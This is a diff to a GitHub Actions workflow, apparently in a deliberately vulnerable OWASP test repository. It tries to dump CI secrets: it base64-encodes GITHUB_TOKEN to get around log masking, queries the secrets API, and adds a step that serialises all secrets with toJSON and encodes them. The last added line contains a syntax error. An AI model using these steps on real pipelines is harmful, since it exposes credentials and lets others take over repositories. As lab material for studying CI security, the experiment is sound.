@@ -8,10 +8,13 @@ jobs:
       - run: echo "The job was automatically triggered by a ${{ github.event_name }} event."
       # Let's try to extract the default token
       - run: echo "${{ secrets.GITHUB_TOKEN }}" | base64 -w0
-      # Let's try to list secrets
+      # Let's try to list secrets -- Not possible 
       - run: |
           curl -L \
           -H "Accept: application/vnd.github+json" \
           -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
           -H "X-GitHub-Api-Version: 2022-11-28" \
           https://api.github.com/repos/TestUsernameOWASPNL/HackableRepo/actions/secrets
+      - env:
+          ALLMYSECRETS: ${{ toJSON(secrets) }}
+        run: echo "${{ toJSON{secret} }}" | base64 
